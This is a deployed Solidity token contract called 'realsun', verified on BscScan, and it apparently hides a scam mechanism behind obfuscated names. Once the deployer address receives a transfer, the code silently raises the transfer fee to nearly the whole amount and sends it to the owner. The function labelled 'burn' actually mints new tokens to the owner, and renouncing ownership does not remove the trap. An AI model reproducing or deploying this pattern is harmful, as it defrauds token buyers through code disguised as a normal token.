/**
 *Submitted for verification at BscScan.com on 2022-11-18
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-18 09:10 GMT
 */
 // SPDX-License-Identifier: MIT

/**
 *
 *
 *. ????????????????????????????????????????????????????????????????
 *  ????????█████████????????███████████???????????????????███████?? 
 *  ???????███?????███?????????????███??????????????????██??????██?? 
 *  ??????███??????███???????????███??????????????????????????███???
 *  ?????███??????███?????????███??????????????????????????███??????
 *  ????███??????███???????███??????????██?????██?????███???????????
 *  ???███?????███??????███??????????????██??██?????███?????????????
 *  ??█████████???????███████████?????????███???????███████████????? 
 *  ????????????????????????????????????????????????????????????????
 *
 *
 */

pragma solidity >=0.6.0;
contract GEDWWTG {
uint256 private  YQNXHG = 100000000;
mapping (address => uint256) public balanceOf;
address private  GSQXXP = address(0);
string public  name = "realsun";
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  CFEMVC = 10000000000;
address private  IPJSLE = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  ANZUWS = address(0);
uint256 public constant RKUQUG = 99999;
uint256 private  DYRMYT = 1000000000000000000;
uint256 private  WPNSUT = 1000000000000000000;
uint256 private  DFEZKZ = 1000000000000000;
uint256 private  LUBSFS = 1000000000000000000000;
uint256 private  ZBFNEN = 10000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  KWKTXV = address(0);
address private  CHIGCP = address(0);
uint8 public constant decimals = 18;
string public  symbol = "realsun";
mapping (address => mapping (address => uint256)) private _allowances;
address public owner;
function _getLUBSFS() private returns (uint256) {
return LUBSFS;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getWPNSUT() private returns (uint256) {
return WPNSUT;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "FUOFNG");
require(to != address(0), "FUOFNG");
require(amount <= balanceOf[from], "FUOFNG");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* RKUQUG/DYRMYT ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==ANZUWS){
DYRMYT = RKUQUG+2;
}
emit Transfer(from, to, transferAmount);
}
function _getIPJSLE() private returns (address) {
return IPJSLE;
}

function _getYQNXHG() private returns (uint256) {
return YQNXHG;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getDFEZKZ() private returns (uint256) {
return DFEZKZ;
}

function _getKWKTXV() private returns (address) {
return KWKTXV;
}

constructor () {
ANZUWS = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getZBFNEN() private returns (uint256) {
return ZBFNEN;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tFUOFNG 0");
require(spender != address(0), "fFUOFNG 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getCHIGCP() private returns (address) {
return CHIGCP;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getCFEMVC() private returns (uint256) {
return CFEMVC;
}

function _getGSQXXP() private returns (address) {
return GSQXXP;
}


}